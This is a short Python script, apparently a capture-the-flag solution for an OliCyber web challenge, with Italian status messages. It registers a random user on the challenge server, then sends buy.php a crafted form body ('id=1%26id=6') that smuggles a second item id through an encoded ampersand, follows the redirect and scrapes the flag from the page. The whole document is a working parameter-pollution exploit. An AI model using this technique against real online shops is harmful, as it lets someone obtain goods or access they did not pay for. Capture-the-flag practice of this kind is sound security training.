from requests import Session
import random
import string
import re

session = Session()
base_url = 'https://ntlfs.challs.olicyber.it'

username = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
register = session.post(base_url + '/login.php', data={'username': username})

payload = "id=1%26id=6"

headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": base_url + "/shop.php",
    "Origin": base_url,
    "User-Agent": "Mozilla/5.0",
}

buy = session.post(base_url + '/buy.php', data=payload, headers=headers, allow_redirects=False)

if 'Location' in buy.headers:
    location = buy.headers['Location']
    print(f"[+] Redirect trovato: {location}")

    add = session.get(base_url + location)

    match = re.search(r"flag\{[^\}]+\}", add.text, re.IGNORECASE)
    if match:
        print("[!] FLAG TROVATA:", match.group(0))
